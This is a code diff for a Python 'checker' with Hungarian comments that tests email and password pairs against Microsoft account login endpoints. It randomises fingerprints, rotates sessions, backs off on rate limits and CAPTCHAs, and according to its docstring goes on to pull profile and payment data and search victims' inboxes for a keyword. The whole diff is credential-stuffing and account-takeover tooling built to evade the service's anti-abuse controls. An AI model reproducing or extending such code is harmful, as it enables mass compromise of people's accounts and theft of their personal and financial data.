@@ -4,786 +4,1034 @@ import json
 import re
 import time
 import random
-import threading
+import string
+from urllib.parse import quote, unquote
 from fake_useragent import UserAgent
-from urllib3.util.retry import Retry
-from requests.adapters import HTTPAdapter
 
 _ua = UserAgent()
 
-# ═══════════════════════════════════════════════════
-# 🔥 ADAPTÍV RATE LIMITER (THREAD-SAFE)
-# ═══════════════════════════════════════════════════
+# ============================================================
+# FINGERPRINT - Változatos böngésző szimulálás
+# ============================================================
+
+CHROME_VERSIONS = [
+    "120.0.0.0", "121.0.0.0", "122.0.0.0", "123.0.0.0",
+    "124.0.0.0", "125.0.0.0", "126.0.0.0", "127.0.0.0",
+    "128.0.0.0", "129.0.0.0", "130.0.0.0", "131.0.0.0",
+    "132.0.0.0", "133.0.0.0", "134.0.0.0", "135.0.0.0",
+    "136.0.0.0", "137.0.0.0", "138.0.0.0", "139.0.0.0",
+]
+
+SEC_CH_UA_TEMPLATES = [
+    '"Chromium";v="{v}", "Not;A=Brand";v="99"',
+    '"Not_A Brand";v="8", "Chromium";v="{v}", "Google Chrome";v="{v}"',
+    '"Chromium";v="{v}", "Google Chrome";v="{v}", "Not-A.Brand";v="99"',
+    '"Google Chrome";v="{v}", "Chromium";v="{v}", "Not=A?Brand";v="24"',
+    '"Chromium";v="{v}", "Not A(Brand";v="99", "Google Chrome";v="{v}"',
+]
+
+ACCEPT_LANGUAGES = [
+    "en-US,en;q=0.9",
+    "en-GB,en;q=0.9",
+    "fr-FR,fr;q=0.9",
+    "de-DE,de;q=0.9,en;q=0.8",
+    "es-ES,es;q=0.9,en;q=0.8",
+    "it-IT,it;q=0.9,en;q=0.8",
+    "nl-NL,nl;q=0.9,en;q=0.8",
+    "pt-BR,pt;q=0.9,en;q=0.8",
+    "pl-PL,pl;q=0.9,en;q=0.8",
+    "en-US,en;q=0.9,fr;q=0.7",
+]
+
+CORRELATION_MARKETS = [
+    "en-US", "en-GB", "fr-FR", "de-DE", "it-IT",
+    "es-ES", "nl-NL", "pt-BR", "pl-PL", "sv-SE",
+    "da-DK", "nb-NO", "fi-FI", "cs-CZ", "hu-HU",
+]
+
+
+class BrowserFingerprint:
+    """Realisztikus asztali böngésző fingerprint"""
+
+    def __init__(self):
+        self.chrome_version = random.choice(CHROME_VERSIONS)
+        self.major_version = self.chrome_version.split(".")[0]
+        self.accept_language = random.choice(ACCEPT_LANGUAGES)
+        self.market = random.choice(CORRELATION_MARKETS)
+        self.user_agent = self._generate_ua()
+        self.sec_ch_ua = self._generate_sec_ch_ua()
+
+    def _generate_ua(self):
+        return (
+            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+            f"AppleWebKit/537.36 (KHTML, like Gecko) "
+            f"Chrome/{self.chrome_version} Safari/537.36"
+        )
+
+    def _generate_sec_ch_ua(self):
+        template = random.choice(SEC_CH_UA_TEMPLATES)
+        return template.replace("{v}", self.major_version)
+
+
+# ============================================================
+# ADAPTIVE RATE LIMITER
+# ============================================================
+
 class AdaptiveRateLimiter:
     """
-    Figyeli a Microsoft válaszait és automatikusan lassít
-    ha IP ban közeledik. Proxy nélkül ez a legfontosabb!
+    Intelligens sebességszabályozó:
+    - Emberi mintázat
+    - Rate limit detektálás és backoff
     """
-    def __init__(self):
-        self._lock = threading.Lock()
-        # Alap sebesség (másodperc / kérés)
-        self.base_delay = 3.0
-        # Jelenlegi szorzó (nő ha hibák jönnek)
-        self.multiplier = 1.0
-        # Max szorzó
-        self.max_multiplier = 15.0
-        # Egymás utáni hibák száma
+
+    def __init__(self, base_delay: float = 0.3):
+        self.base_delay = max(base_delay, 0.2)
+        self.current_delay = self.base_delay
         self.consecutive_errors = 0
-        # Egymás utáni sikerek száma
         self.consecutive_success = 0
-        # Cooldown vége (unix timestamp)
-        self.cooldown_until = 0
-        # Összes kérés számláló
         self.total_requests = 0
-        # Utolsó kérés ideje
-        self.last_request_time = 0
-        # Kérések az utolsó percben
-        self.recent_requests = []
-        # Ban detektálva flag
-        self.ban_detected = False
+        self.rate_limited_count = 0
+        self.burst_counter = 0
+        self.max_delay = 60.0
+        self.min_delay = 0.2
 
-    def wait_before_request(self):
-        """Minden kérés előtt hívd meg - várakozik ha kell"""
-        with self._lock:
-            now = time.time()
+    def get_delay(self) -> float:
+        self.total_requests += 1
+        self.burst_counter += 1
 
-            # 1) Ha cooldown aktív, várunk
-            if now < self.cooldown_until:
-                wait = self.cooldown_until - now
-                print(f"🧊 COOLDOWN aktív! Várakozás: {wait:.0f}s")
-                self._lock.release()
-                time.sleep(wait)
-                self._lock.acquire()
-                now = time.time()
+        jitter = random.uniform(0.05, 0.4)
+        delay = self.current_delay + jitter
 
-            # 2) Régi kérések törlése (2 perces ablak)
-            self.recent_requests = [
-                t for t in self.recent_requests
-                if now - t < 120
-            ]
+        # Burst szünet (5-12 kérésenként)
+        if self.burst_counter >= random.randint(5, 12):
+            delay += random.uniform(1.0, 3.0)
+            self.burst_counter = 0
 
-            # 3) Percenkénti limit (max 8 kérés/perc)
-            requests_last_minute = len([
-                t for t in self.recent_requests
-                if now - t < 60
-            ])
-            if requests_last_minute >= 8:
-                extra_wait = random.uniform(15, 30)
-                print(f"⚠️ Percenkénti limit közel ({requests_last_minute}/8)! +{extra_wait:.0f}s")
-                self._lock.release()
-                time.sleep(extra_wait)
-                self._lock.acquire()
-                now = time.time()
+        # Nagyobb szünet (30-50 kérésenként)
+        if self.total_requests % random.randint(30, 50) == 0:
+            delay += random.uniform(5.0, 12.0)
 
-            # 4) Delay kiszámítása szorzóval + jitter
-            delay = self.base_delay * self.multiplier
-            jitter = random.uniform(0.5, delay * 0.4)
-            total_delay = delay + jitter
+        # Random micro-pause (10%)
+        if random.random() < 0.10:
+            delay += random.uniform(0.5, 2.0)
 
-            # 5) Minimum idő az utolsó kérés óta
-            elapsed = now - self.last_request_time
-            if elapsed < total_delay:
-                sleep_time = total_delay - elapsed
-                self._lock.release()
-                time.sleep(sleep_time)
-                self._lock.acquire()
-
-            # 6) Kérés rögzítése
-            self.last_request_time = time.time()
-            self.recent_requests.append(self.last_request_time)
-            self.total_requests += 1
+        return delay
 
     def report_success(self):
-        """Sikeres kérés után hívd - csökkenti a szorzót"""
-        with self._lock:
-            self.consecutive_errors = 0
-            self.consecutive_success += 1
-            self.ban_detected = False
-
-            # Fokozatosan gyorsítunk vissza (de lassan!)
-            if self.consecutive_success >= 5 and self.multiplier > 1.0:
-                self.multiplier = max(1.0, self.multiplier * 0.9)
-                print(f"✅ Szorzó csökkentve: {self.multiplier:.2f}x")
-            if self.consecutive_success >= 15 and self.multiplier > 1.0:
-                self.multiplier = max(1.0, self.multiplier * 0.8)
-
-    def report_error(self, error_type: str = "generic"):
-        """
-        Hiba után hívd meg - növeli a szorzót
-        error_type: "rate_limit", "captcha", "block", "generic"
-        """
-        with self._lock:
+        self.consecutive_errors = 0
+        self.consecutive_success += 1
+        if self.consecutive_success >= 8 and self.current_delay > self.min_delay:
+            self.current_delay = max(self.min_delay, self.current_delay * 0.95)
             self.consecutive_success = 0
-            self.consecutive_errors += 1
 
-            if error_type == "rate_limit":
-                # 429-es válasz - komoly lassítás
-                self.multiplier = min(
-                    self.max_multiplier,
-                    self.multiplier * 2.5
-                )
-                cooldown = random.uniform(60, 120)
-                self.cooldown_until = time.time() + cooldown
-                print(f"🚨 RATE LIMIT! Szorzó: {self.multiplier:.1f}x | Cooldown: {cooldown:.0f}s")
+    def report_rate_limit(self):
+        self.consecutive_success = 0
+        self.consecutive_errors += 1
+        self.rate_limited_count += 1
+        backoff = min(self.max_delay, self.base_delay * (2 ** min(self.rate_limited_count, 5)))
+        self.current_delay = backoff
+        return backoff + random.uniform(5.0, 15.0)
 
-            elif error_type == "captcha":
-                # Captcha megjelent - közepesen lassítunk
-                self.multiplier = min(
-                    self.max_multiplier,
-                    self.multiplier * 2.0
-                )
-                cooldown = random.uniform(45, 90)
-                self.cooldown_until = time.time() + cooldown
-                print(f"🤖 CAPTCHA detektálva! Szorzó: {self.multiplier:.1f}x | Cooldown: {cooldown:.0f}s")
-
-            elif error_type == "block":
-                # IP block - nagyon komoly
-                self.ban_detected = True
-                self.multiplier = self.max_multiplier
-                cooldown = random.uniform(120, 300)
-                self.cooldown_until = time.time() + cooldown
-                print(f"🔴 IP BLOCK DETEKTÁLVA! Cooldown: {cooldown:.0f}s")
-
-            else:
-                # Általános hiba - kicsit lassítunk
-                self.multiplier = min(
-                    self.max_multiplier,
-                    self.multiplier * 1.3
-                )
-                if self.consecutive_errors >= 3:
-                    cooldown = random.uniform(20, 45)
-                    self.cooldown_until = time.time() + cooldown
-                    print(f"⚠️ {self.consecutive_errors} egymás utáni hiba! Cooldown: {cooldown:.0f}s")
-
-    def get_status(self) -> dict:
-        """Jelenlegi állapot lekérdezése"""
-        with self._lock:
-            return {
-                "multiplier": round(self.multiplier, 2),
-                "consecutive_errors": self.consecutive_errors,
-                "total_requests": self.total_requests,
-                "ban_detected": self.ban_detected,
-                "effective_delay": round(self.base_delay * self.multiplier, 1)
-            }
+    def report_error(self):
+        self.consecutive_success = 0
+        self.consecutive_errors += 1
+        self.current_delay = min(self.max_delay, self.current_delay * 1.2)
 
 
-# Globális rate limiter példány
-_rate_limiter = AdaptiveRateLimiter()
+# ============================================================
+# SESSION MANAGER
+# ============================================================
 
+class SessionManager:
+    """Session rotáció: minden N kérés után új session"""
 
-# ═══════════════════════════════════════════════════
-# 🔍 VÁLASZ ELEMZŐ - DETEKTÁLJA A BAN JELEKET
-# ═══════════════════════════════════════════════════
-def detect_block_signals(response) -> str:
-    """
-    Elemzi a Microsoft válaszát és visszaadja a hiba típusát.
-    Returns: "ok", "rate_limit", "captcha", "block", "error"
-    """
-    status = response.status_code
+    def __init__(self, rotate_every: int = 5):
+        self.rotate_every = rotate_every
+        self.request_count = 0
+        self.session = None
+        self._create_new_session()
 
-    # HTTP 429 = Rate Limit
-    if status == 429:
-        return "rate_limit"
-
-    # HTTP 403 = Tiltás
-    if status == 403:
-        return "block"
-
-    # HTTP 503 = Szerver túlterhelt (gyakran rate limit miatt)
-    if status == 503:
-        return "rate_limit"
-
-    text = response.text.lower() if response.text else ""
-
-    # Captcha detektálás
-    captcha_signs = [
-        "captcha", "recaptcha", "hcaptcha",
-        "arkose", "funcaptcha", "enforcementframe",
-        "hip_required", "hipchallenge",
-        "proofupaliaseserror"
-    ]
-    for sign in captcha_signs:
-        if sign in text:
-            return "captcha"
-
-    # Block/ban detektálás
-    block_signs = [
-        "blocked", "suspicious activity",
-        "too many requests", "try again later",
-        "temporarily locked", "unusual activity",
-        "account has been locked",
-        "requestthrottled"
-    ]
-    for sign in block_signs:
-        if sign in text:
-            return "block"
-
-    # Rate limit jelek a headers-ben
-    retry_after = response.headers.get("Retry-After", "")
-    if retry_after:
-        return "rate_limit"
-
-    x_ratelimit = response.headers.get("X-RateLimit-Remaining", "")
-    if x_ratelimit and x_ratelimit.isdigit() and int(x_ratelimit) <= 1:
-        return "rate_limit"
-
-    return "ok"
-
-
-# ═══════════════════════════════════════════════════
-# 🎭 SESSION BUILDER - EGYEDI FINGERPRINT MINDEN KÉRÉSHEZ
-# ═══════════════════════════════════════════════════
-def create_stealth_session() -> requests.Session:
-    """
-    Minden ellenőrzéshez teljesen új session,
-    egyedi fingerprint-tel.
-    """
-    session = requests.Session()
-
-    # Retry stratégia: NE retry-oljon automatikusan!
-    # (mert az dupla kérést jelent)
-    adapter = HTTPAdapter(
-        max_retries=Retry(
-            total=0,
-            backoff_factor=0
-        ),
-        pool_connections=1,
-        pool_maxsize=1
-    )
-    session.mount("https://", adapter)
-    session.mount("http://", adapter)
-
-    # Cookie jar ürítése
-    session.cookies.clear()
-
-    return session
-
-
-def generate_fingerprint() -> dict:
-    """
-    Egyedi böngésző-fingerprint generálás
-    minden kéréshez más-más
-    """
-    user_agent = generate_user_agent()
-
-    # Különböző Android verziók
-    android_versions = ["26", "27", "28", "29", "30", "31", "32", "33"]
-    client_versions = [
-        "1.1.0+9e54a0d1", "1.2.0+abc12345",
-        "1.0.9+ff34ee01", "1.1.1+deadbeef",
-        "1.3.0+cafe1234"
-    ]
-
-    # Különböző nyelvek (realisztikusabb)
-    languages = [
-        "en-US,en;q=0.9",
-        "en-GB,en;q=0.9",
-        "en-US,en;q=0.9,de;q=0.8",
-        "en-US,en;q=0.9,fr;q=0.8",
-        "en,en-US;q=0.9",
-        "en-US,en;q=0.8"
-    ]
-
-    return {
-        "user_agent": user_agent,
-        "client_request_id": str(uuid.uuid4()),
-        "correlation_id": str(uuid.uuid4()),
-        "client_os": random.choice(android_versions),
-        "client_ver": random.choice(client_versions),
-        "language": random.choice(languages)
-    }
-
-
-def generate_user_agent():
-    try:
-        return _ua.random
-    except:
-        fallbacks = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
-        ]
-        return random.choice(fallbacks)
-
-
-# ═══════════════════════════════════════════════════
-# 🔥 FŐ CHECKER FUNKCIÓ (ADAPTÍV VÉDELEMMEL)
-# ═══════════════════════════════════════════════════
-def checker_worker_single(email: str, password: str, keyword: str):
-    session = create_stealth_session()
-    fp = generate_fingerprint()
-
-    try:
-        # ═══════════════════════════════════════
-        # 1. LÉPÉS: Authorize oldal lekérése
-        # ═══════════════════════════════════════
-        _rate_limiter.wait_before_request()
-
-        url = (
-            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
-            f"client_info=1&haschrome=1&login_hint={email}"
-            "&mkt=en&response_type=code"
-            "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
-            "&scope=profile%20openid%20offline_access"
-            "%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
-            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite"
-            "%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
-        )
-
-        headers = {
-            "Connection": "keep-alive",
-            "Upgrade-Insecure-Requests": "1",
-            "User-Agent": fp["user_agent"],
-            "Accept": (
-                "text/html,application/xhtml+xml,"
-                "application/xml;q=0.9,*/*;q=0.8"
-            ),
-            "return-client-request-id": "false",
-            "client-request-id": fp["client_request_id"],
-            "x-ms-sso-ignore-sso": "1",
-            "correlation-id": fp["correlation_id"],
-            "x-client-ver": fp["client_ver"],
-            "x-client-os": fp["client_os"],
-            "x-client-sku": "MSAL.xplat.android",
-            "x-client-src-sku": "MSAL.xplat.android",
-            "X-Requested-With": "com.microsoft.outlooklite",
-            "Sec-Fetch-Site": "none",
-            "Sec-Fetch-Mode": "navigate",
-            "Sec-Fetch-User": "?1",
-            "Sec-Fetch-Dest": "document",
-            "Accept-Encoding": "gzip, deflate",
-            "Accept-Language": fp["language"],
-        }
-
-        response = session.get(
-            url, headers=headers,
-            allow_redirects=True, timeout=30
-        )
-
-        # 🔍 Válasz ellenőrzése
-        signal = detect_block_signals(response)
-        if signal != "ok":
-            _rate_limiter.report_error(signal)
-            return {
-                "status": "error",
-                "reason": f"Block signal: {signal}"
-            }
-
-        response_text = response.text
-
-        # PPFT + urlPost kinyerése
-        PPFT = ""
-        urlPost = ""
-
-        server_data_pattern = r'var ServerData = ({.*?});'
-        server_data_match = re.search(
-            server_data_pattern, response_text, re.DOTALL
-        )
-
-        if server_data_match:
+    def _create_new_session(self):
+        if self.session:
             try:
-                server_data_json = server_data_match.group(1)
-                server_data = json.loads(server_data_json)
-                sFTTag = server_data.get('sFTTag', '')
-                if sFTTag:
-                    ppft_pattern = r'value="([^"]+)"'
-                    ppft_match = re.search(ppft_pattern, sFTTag)
-                    if ppft_match:
-                        PPFT = ppft_match.group(1)
-                urlPost = server_data.get('urlPost', '')
-            except json.JSONDecodeError:
+                self.session.close()
+            except:
+                pass
+        self.session = requests.Session()
+        self.session.cookies.clear()
+        self.request_count = 0
+
+    def get_session(self) -> requests.Session:
+        self.request_count += 1
+        if self.request_count >= self.rotate_every:
+            self._create_new_session()
+        return self.session
+
+    def force_rotate(self):
+        self._create_new_session()
+
+    def close(self):
+        if self.session:
+            try:
+                self.session.close()
+            except:
                 pass
 
-        if not PPFT:
-            start_marker = 'name="PPFT" value="'
-            start_index = response_text.find(start_marker)
-            if start_index != -1:
-                start_index += len(start_marker)
-                end_index = response_text.find('"', start_index)
-                if end_index != -1:
-                    PPFT = response_text[start_index:end_index]
 
-        if not urlPost:
-            urlpost_pattern = r'"urlPost":"([^"]+)"'
-            urlpost_match = re.search(urlpost_pattern, response_text)
-            if urlpost_match:
-                urlPost = urlpost_match.group(1)
+# ============================================================
+# GLOBAL STATE
+# ============================================================
 
-        if not PPFT or not urlPost:
-            _rate_limiter.report_error("generic")
-            return {"status": "bad", "reason": "No PPFT/urlPost"}
+_rate_limiter = None
+_session_manager = None
 
-        _rate_limiter.report_success()
 
-        # Cookie-k mentése
-        cookies_dict = session.cookies.get_dict()
-        MSPRequ = cookies_dict.get('MSPRequ', '')
-        uaid_cookie = cookies_dict.get('uaid', '')
-        MSPOK = cookies_dict.get('MSPOK', '')
-        OParams = cookies_dict.get('OParams', '')
-        referer_url = response.url
+def get_rate_limiter(base_delay: float = 0.3) -> AdaptiveRateLimiter:
+    global _rate_limiter
+    if _rate_limiter is None:
+        _rate_limiter = AdaptiveRateLimiter(base_delay)
+    return _rate_limiter
 
-        # ═══════════════════════════════════════
-        # 2. LÉPÉS: Bejelentkezés POST
-        # ═══════════════════════════════════════
-        _rate_limiter.wait_before_request()
 
-        data_string = (
-            f"i13=1&login={email}&loginfmt={email}"
-            f"&type=11&LoginOptions=1&lrt=&lrtPartition="
-            f"&hisRegion=&hisScaleUnit=&passwd={password}"
-            f"&ps=2&psRNGCDefaultType=&psRNGCEntropy="
-            f"&psRNGCSLK=&canary=&ctx=&hpgrequestid="
-            f"&PPFT={PPFT}&PPSX=Passport&NewUser=1"
-            f"&FoundMSAs=&fspost=0&i21=0"
-            f"&CookieDisclosure=0&IsFidoSupported=0"
-            f"&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772"
-        )
+def reset_rate_limiter(base_delay: float = 0.3):
+    global _rate_limiter
+    _rate_limiter = AdaptiveRateLimiter(base_delay)
 
-        headers_post = {
-            "User-Agent": fp["user_agent"],
-            "Pragma": "no-cache",
-            "Accept": (
-                "text/html,application/xhtml+xml,"
-                "application/xml;q=0.9,*/*;q=0.8"
-            ),
-            "Host": "login.live.com",
-            "Connection": "keep-alive",
-            "Content-Length": str(len(data_string)),
-            "Cache-Control": "max-age=0",
-            "Upgrade-Insecure-Requests": "1",
-            "Origin": "https://login.live.com",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Requested-With": "com.microsoft.outlooklite",
-            "Sec-Fetch-Site": "same-origin",
-            "Sec-Fetch-Mode": "navigate",
-            "Sec-Fetch-User": "?1",
-            "Sec-Fetch-Dest": "document",
-            "Referer": referer_url,
-            "Accept-Encoding": "gzip, deflate",
-            "Accept-Language": fp["language"],
-            "Cookie": (
-                f"MSPRequ={MSPRequ}; uaid={uaid_cookie}; "
-                f"MSPOK={MSPOK}; OParams={OParams}"
-            )
-        }
 
-        post_response = session.post(
-            urlPost, data=data_string,
-            headers=headers_post,
-            allow_redirects=False, timeout=30
-        )
+def get_session_manager() -> SessionManager:
+    global _session_manager
+    if _session_manager is None:
+        _session_manager = SessionManager(rotate_every=random.randint(3, 8))
+    return _session_manager
 
-        # 🔍 Válasz ellenőrzése
-        signal = detect_block_signals(post_response)
-        if signal != "ok":
-            _rate_limiter.report_error(signal)
-            return {
-                "status": "error",
-                "reason": f"Login block: {signal}"
-            }
 
-        cookies_dict = session.cookies.get_dict()
-        if "__Host-MSAAUTHP" not in cookies_dict:
-            # Ez NEM rate limit hiba, hanem rossz jelszó
-            # Tehát NEM büntetjük a rate limitert
-            return {"status": "bad", "reason": "Auth failed"}
+def reset_session_manager():
+    global _session_manager
+    if _session_manager:
+        _session_manager.close()
+    _session_manager = SessionManager(rotate_every=random.randint(3, 8))
 
-        _rate_limiter.report_success()
 
-        # Auth code kinyerése
-        auth_code = ""
-        if post_response.status_code in [301, 302, 303, 307, 308]:
-            redirect_url = post_response.headers.get('Location', '')
-            if (redirect_url
-                    and 'msauth://' in redirect_url
-                    and 'code=' in redirect_url):
-                auth_code = redirect_url.split('code=')[1].split('&')[0]
+# ============================================================
+# RATE LIMIT DETEKTÁLÁS
+# ============================================================
+
+def is_rate_limited(response) -> bool:
+    if response.status_code in [429, 503]:
+        return True
+    if response.status_code == 403:
+        text = response.text.lower()
+        if any(kw in text for kw in ["rate limit", "too many", "throttl", "blocked", "captcha"]):
+            return True
+    text = response.text.lower()
+    if any(ind in text for ind in [
+        "too many requests", "rate limit", "throttled",
+        "please try again later", "temporarily blocked",
+        "unusual activity", "captcha", "areyouhuman",
+    ]):
+        return True
+    if response.headers.get("Retry-After"):
+        return True
+    return False
+
+
+def is_too_many_signins(text: str) -> bool:
+    """Config-ból: 'You've tried to sign in too many times'"""
+    indicators = [
+        "tried to sign in too many times",
+        "ve tried to sign in too many times",
+        "You've tried to sign in too many times",
+    ]
+    return any(ind.lower() in text.lower() for ind in indicators)
+
+
+# ============================================================
+# HTML PARSER HELPERS
+# ============================================================
+
+def extract_between(text: str, left: str, right: str) -> str:
+    """LR parser - mint a config PARSE utasítása"""
+    start = text.find(left)
+    if start == -1:
+        return ""
+    start += len(left)
+    end = text.find(right, start)
+    if end == -1:
+        return text[start:]
+    return text[start:end]
+
+
+def extract_css_value(html: str, selector_name: str, attr: str = "value") -> str:
+    """
+    CSS selector parser - mint a config PARSE CSS utasítása
+    Pl: [name="__RequestVerificationToken"] -> value
+    """
+    pattern = rf'name="{selector_name}"[^>]*{attr}="([^"]*)"'
+    match = re.search(pattern, html, re.IGNORECASE)
+    if match:
+        return match.group(1)
+    # Fordított sorrend is lehet
+    pattern2 = rf'{attr}="([^"]*)"[^>]*name="{selector_name}"'
+    match2 = re.search(pattern2, html, re.IGNORECASE)
+    if match2:
+        return match2.group(1)
+    return ""
+
+
+# ============================================================
+# FŐ CHECKER - A CONFIG FLOW-JA ALAPJÁN
+# ============================================================
+
+def checker_worker_single(email: str, password: str, keyword: str):
+    """
+    A config PONTOS flow-ját követi:
+    1. GET onedrive.live.com/?gologin=1 (login oldal)
+    2. POST login.live.com/ppsecure/post.srf (jelszó beküldés)
+    3. KEYCHECK (siker/hiba/2FA/retry ellenőrzés)
+    4. GET account.microsoft.com (profil oldal)
+    5. POST auth/complete-signin (session befejezés)
+    6. GET personal-info API (név, ország, születésnap)
+    7. GET payment-instruments (fizetési adatok)
+    8. Inbox keresés a keyword-re
+    """
+
+    rate_limiter = get_rate_limiter()
+    session_manager = get_session_manager()
+    fp = BrowserFingerprint()
+    max_retries = 3
+
+    for attempt in range(max_retries):
+        session = session_manager.get_session()
+
+        if attempt > 0:
+            fp = BrowserFingerprint()
+            session_manager.force_rotate()
+            session = session_manager.get_session()
+            wait_time = rate_limiter.get_delay() * (attempt + 1)
+            time.sleep(wait_time)
+
+        try:
+            result = _do_check_onedrive_flow(session, email, password, keyword, fp, rate_limiter)
+
+            if result.get("_rate_limited"):
+                wait = rate_limiter.report_rate_limit()
+                time.sleep(wait)
+                session_manager.force_rotate()
+                continue
+
+            if result.get("_retry"):
+                rate_limiter.report_error()
+                time.sleep(random.uniform(3, 8))
+                session_manager.force_rotate()
+                continue
+
+            if result["status"] in ["hit", "custom", "bad"]:
+                rate_limiter.report_success()
+
+            return result
+
+        except requests.exceptions.Timeout:
+            rate_limiter.report_error()
+            if attempt < max_retries - 1:
+                time.sleep(random.uniform(3, 8))
+                session_manager.force_rotate()
+                continue
+            return {"status": "error", "reason": "Timeout"}
+
+        except requests.exceptions.ConnectionError:
+            rate_limiter.report_rate_limit()
+            if attempt < max_retries - 1:
+                time.sleep(random.uniform(10, 25))
+                session_manager.force_rotate()
+                continue
+            return {"status": "error", "reason": "Connection error"}
+
+        except Exception as e:
+            rate_limiter.report_error()
+            if attempt < max_retries - 1:
+                time.sleep(random.uniform(2, 5))
+                session_manager.force_rotate()
+                continue
+            return {"status": "error", "reason": str(e)}
+
+    return {"status": "error", "reason": "Max retries exceeded"}
+
+
+def _do_check_onedrive_flow(session, email: str, password: str, keyword: str, fp: BrowserFingerprint, rate_limiter: AdaptiveRateLimiter):
+    """
+    A CONFIG PONTOS FLOW-JA:
+    Lépésről lépésre ugyanazt csinálja mint a config script
+    """
+
+    # ============================================================
+    # STEP 1: GET onedrive.live.com/?gologin=1
+    # A config első REQUEST-je - ez hozza a login oldalt
+    # ============================================================
+
+    time.sleep(random.uniform(0.1, 0.4))
+
+    step1_url = "https://onedrive.live.com/?gologin=1"
+    step1_headers = {
+        "User-Agent": fp.user_agent,
+        "Pragma": "no-cache",
+        "Accept": "*/*",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": fp.accept_language,
+        "Connection": "keep-alive",
+        "Upgrade-Insecure-Requests": "1",
+    }
+
+    resp1 = session.get(step1_url, headers=step1_headers, allow_redirects=True, timeout=30)
+
+    if is_rate_limited(resp1):
+        return {"_rate_limited": True, "status": "error", "reason": "Rate limited step1"}
+
+    source1 = resp1.text
+
+    # PARSE - pontosan a config szerint
+    # bk= érték
+    bk = extract_between(source1, 'bk=', '",')
+    if not bk:
+        bk = extract_between(source1, 'bk=', '"')
+
+    # contextid
+    contextid = extract_between(source1, 'contextid%3D', '%')
+    if not contextid:
+        contextid = extract_between(source1, 'contextid=', '&')
+
+    # opid
+    opid = extract_between(source1, 'opid%3D', '%')
+    if not opid:
+        opid = extract_between(source1, 'opid=', '&')
+
+    # uaid cookie
+    uaid = session.cookies.get("uaid", "")
+
+    # PPFT token - a config szerint: LR "PPFT\" id=\"i0327\" value=\"" "\"/"
+    ppft = extract_between(source1, 'PPFT" id="i0327" value="', '"/')
+    if not ppft:
+        ppft = extract_between(source1, 'PPFT\\" id=\\"i0327\\" value=\\"', '\\"/')
+    if not ppft:
+        # Fallback: bármilyen PPFT
+        ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', source1)
+        if ppft_match:
+            ppft = ppft_match.group(1)
         else:
-            redirect_pattern = (
-                r'window\.location\s*=\s*["\']([^"\']+)["\']'
-            )
-            redirect_match = re.search(
-                redirect_pattern, post_response.text
-            )
-            if redirect_match:
-                redirect_url = redirect_match.group(1)
-                if ('msauth://' in redirect_url
-                        and 'code=' in redirect_url):
-                    auth_code = (
-                        redirect_url.split('code=')[1].split('&')[0]
-                    )
+            ppft_match2 = re.search(r'value="([^"]+)"[^>]*name="PPFT"', source1)
+            if ppft_match2:
+                ppft = ppft_match2.group(1)
 
-        CID = cookies_dict.get('MSPCID', '')
-        if CID:
-            CID = CID.upper()
+    if not ppft:
+        return {"status": "bad", "reason": "No PPFT found"}
 
-        # ═══════════════════════════════════════
-        # 3. LÉPÉS: Token kérés
-        # ═══════════════════════════════════════
-        access_token = ""
-        if auth_code:
-            _rate_limiter.wait_before_request()
+    # ============================================================
+    # STEP 2: POST login (jelszó beküldés)
+    # A config PONTOS URL-jét és POST body-ját használjuk
+    # ============================================================
 
-            url_token = (
-                "https://login.microsoftonline.com/"
-                "consumers/oauth2/v2.0/token"
-            )
-            data_token = {
-                "client_info": "1",
-                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
-                "redirect_uri": (
-                    "msauth://com.microsoft.outlooklite/"
-                    "fcg80qvoM1YMKJZibjBwQcDfOno%3D"
-                ),
-                "grant_type": "authorization_code",
-                "code": auth_code,
-                "scope": (
-                    "profile openid offline_access "
-                    "https://outlook.office.com/M365.Access"
-                )
-            }
-            token_response = session.post(
-                url_token, data=data_token,
-                headers={
-                    "Content-Type": "application/x-www-form-urlencoded",
-                    "User-Agent": fp["user_agent"]
-                },
-                timeout=30
-            )
+    time.sleep(random.uniform(0.5, 1.8))
 
-            signal = detect_block_signals(token_response)
-            if signal != "ok":
-                _rate_limiter.report_error(signal)
-                return {
-                    "status": "error",
-                    "reason": f"Token block: {signal}"
-                }
+    post_url = (
+        f"https://login.live.com/ppsecure/post.srf?"
+        f"mkt=en-GB&id=38936"
+        f"&contextid={contextid}"
+        f"&opid={opid}"
+        f"&bk={bk}"
+        f"&uaid={uaid}"
+        f"&pid=0"
+    )
 
-            if token_response.status_code == 200:
-                token_data = token_response.json()
-                access_token = token_data.get("access_token", "")
-                _rate_limiter.report_success()
+    post_body = (
+        f"ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK="
+        f"&canary=&ctx=&hpgrequestid="
+        f"&PPFT={ppft}"
+        f"&PPSX=Pa&NewUser=1&FoundMSAs=&fspost=0&i21=0"
+        f"&CookieDisclosure=0&IsFidoSupported=1"
+        f"&isSignupPost=0&isRecoveryAttemptPost=0"
+        f"&i13=0&login={quote(email)}&loginfmt={quote(email)}"
+        f"&type=11&LoginOptions=3"
+        f"&lrt=&lrtPartition=&hisRegion=&hisScaleUnit="
+        f"&passwd={quote(password)}"
+    )
 
-        if not access_token or not CID:
-            return {"status": "bad", "reason": "No token"}
+    post_headers = {
+        "Host": "login.live.com",
+        "Cache-Control": "max-age=0",
+        "sec-ch-ua": fp.sec_ch_ua,
